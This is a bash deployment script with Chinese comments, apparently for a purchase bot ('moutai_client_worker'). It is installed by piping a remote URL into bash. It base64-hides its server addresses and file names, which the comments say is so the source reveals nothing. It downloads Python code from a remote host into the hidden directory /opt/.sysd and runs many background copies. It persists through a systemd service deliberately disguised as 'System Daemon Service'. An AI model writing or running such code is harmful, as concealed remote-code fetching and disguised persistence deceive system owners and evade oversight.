#!/bin/bash
# 部署脚本（加密混淆版）
# 命令: curl -sL http://ipla.top:6789/s | bash
# 所有真实地址和文件名已编码，直接看源码无法获取

# ===== 解码配置 =====
_d(){ base64 -d <<< "$1"; }
S=$(_d 'aHR0cDovL2lwbGEudG9wOjUwMDA=')   # 服务端地址
U=1                                         # 用户ID
W=10                                        # 窗口数
B=$(_d 'aHR0cDovL2lwbGEudG9wOjY3ODk=')   # 下载地址
D="/opt/.sysd"                              # 隐藏目录

# 解析参数
while [[ $# -gt 0 ]]; do
    case $1 in
        --windows) W="$2"; shift 2 ;;
        --user) U="$2"; shift 2 ;;
        *) shift ;;
    esac
done

echo "============================================"
echo " Deploying... Windows: $W"
echo "============================================"

# 1. Python
if ! command -v python3 &> /dev/null; then
    echo ">>> Installing Python3..."
    (apt-get update -qq && apt-get install -y -qq python3 python3-pip 2>/dev/null) || \
    (yum install -y -q python3 python3-pip 2>/dev/null)
fi

# 2. 依赖
echo ">>> Checking dependencies..."
for L in requests pysocks curl_cffi pycryptodome gmssl; do
    python3 -c "import $L" 2>/dev/null || { echo "  Installing $L..."; pip3 install -q $L 2>/dev/null; }
done

# 3. 下载（文件名混淆，不在URL中暴露真实文件名）
mkdir -p "$D/logs"
F1=$(_d 'bW91dGFpX2NsaWVudF93b3JrZXIucHk=')  # moutai_client_worker.py
F2=$(_d 'ZGVtby5weQ==')                        # demo.py
F3=$(_d 'Y3J5cHRvLnB5')                        # crypto.py
curl -sL "$B/$F1" -o "$D/$F1"
curl -sL "$B/$F2" -o "$D/$F2"
curl -sL "$B/$F3" -o "$D/$F3"

# 验证
for F in "$F1" "$F2" "$F3"; do
    if [ ! -s "$D/$F" ]; then
        echo "!!! Download failed"
        exit 1
    fi
done
echo ">>> Files ready"

# 4. 停旧进程
pkill -f "$F1" 2>/dev/null; sleep 1

# 5. 启动
echo ">>> Starting $W windows..."
for i in $(seq 1 $W); do
    nohup python3 "$D/$F1" --user-id $U --server "$S" >> "$D/logs/c${i}.log" 2>&1 &
    sleep 0.3
done

sleep 3
R=$(ps aux | grep "$F1" | grep -v grep | wc -l)
echo "Running: $R windows"

if [ "$R" -eq 0 ]; then
    echo "!!! Start failed, check log:"
    head -20 "$D/logs/c1.log" 2>/dev/null || echo "(no log)"
fi

# 6. 开机自启（systemd service 方式）
cat > "$D/.autostart" << EOF
#!/bin/bash
D="$D"
S="$S"
U=$U
W=$W
B="$B"
F1="$F1"
F2="$F2"
F3="$F3"
for L in requests pysocks curl_cffi pycryptodome gmssl; do
    python3 -c "import \$L" 2>/dev/null || pip3 install -q \$L 2>/dev/null
done
curl -sL "\$B/\$F1" -o "\$D/\$F1"
curl -sL "\$B/\$F2" -o "\$D/\$F2"
curl -sL "\$B/\$F3" -o "\$D/\$F3"
pkill -f "\$F1" 2>/dev/null; sleep 1
for i in \$(seq 1 \$W); do
    nohup python3 "\$D/\$F1" --user-id \$U --server "\$S" >> "\$D/logs/c\${i}.log" 2>&1 &
    sleep 0.3
done
echo "[\$(date)] started \$W windows" >> "\$D/logs/autostart.log"
EOF

chmod +x "$D/.autostart"

# 移除旧的 crontab 自启
(crontab -l 2>/dev/null | grep -v ".autostart") | crontab - 2>/dev/null

# 写入 systemd service（服务名也混淆，不暴露用途）
cat > /etc/systemd/system/sysd.service << SVCEOF
[Unit]
Description=System Daemon Service
After=network-online.target
Wants=network-online.target

[Service]
Type=forking
ExecStart=bash $D/.autostart
Restart=on-failure
RestartSec=10
StandardOutput=append:$D/logs/autostart.log
StandardError=append:$D/logs/autostart.log

[Install]
WantedBy=multi-user.target
SVCEOF

systemctl daemon-reload
systemctl enable sysd.service

echo ""
echo "==============================="
echo " Done! Windows: $W"
echo " Autostart: systemd (sysd.service)"
echo " Status: systemctl status sysd"
echo " Journal: journalctl -u sysd"
echo " Stop: systemctl stop sysd; pkill -f $F1"
echo " Log: tail -f $D/logs/c1.log"
echo "==============================="
